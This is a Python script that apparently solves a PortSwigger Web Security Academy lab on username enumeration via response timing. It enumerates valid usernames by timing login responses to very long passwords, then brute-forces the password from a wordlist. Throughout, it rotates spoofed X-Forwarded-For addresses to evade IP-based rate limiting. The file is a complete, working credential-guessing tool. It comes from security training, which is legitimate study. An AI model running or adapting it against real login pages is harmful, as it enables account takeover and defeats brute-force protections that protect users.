# Lab3 in portswigger: Username enumeration via response timing
# This is a script for guessing the username and password for the login page.
import requests
from termcolor import colored

url = "https://0ae6002104ec9698c1ed43ff00e60056.web-security-academy.net/login" # Change the url.
cookies = {"session": "tv47Qq4sQcbb9J011Nd6VBo3RcQzOL6N"} # Change it with your cookies.

def guess_username():
    with open("/PATH/users.txt","r") as file: # Modify it with the users list path.
        octet = 1
        for username in file:
            username = username.strip()
            client = f"192.168.1.{str(octet)}"
            header={"X-Forwarded-For": client}
            # Set your credentials of your account but repeat the password to make it a very long string.
            data = {"username": username, "password": "peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter"} 
            response = requests.post(url, cookies=cookies, data=data, headers=header)
            
            print(client)
            print(f"Time taken: {response.elapsed.total_seconds()}")
            if response.elapsed.total_seconds() > 1:
                print(colored(f"[+] Valid username is found... ","green"))
                return username
            else:
                print(colored(f"[!!] Invalid user: {username}\n","red"))
                octet += 1   
                

def guess_password(username):                
    with open("/PATH/passwords.txt","r") as file: # Modify it with the passwords list path.
        octet = 1
        for password in file:
            password = password.strip()
            client = f"192.168.1.{str(octet)}"
            header={"X-Forwarded-For": client}
            data = {"username": username, "password": password} 
            response = requests.post(url, cookies=cookies, data=data, headers=header)

            print(client)
            print(f"Status {response.status_code}")
            if response.status_code == 302:
                print(colored(f"[+] Valid password is found... ","green"))
                return password  
            else:
                print(colored(f"[!!] Incorrect password: {password}\n","red"))
                octet+=1
                   

def main():
    username = guess_username() 
    password = guess_password(username)
    print()
    print(colored(f"[+] Username: --> {username}","green"))
    print(colored(f"[+] Password: --> {password}","green"))    

if __name__ == '__main__':
    main() 
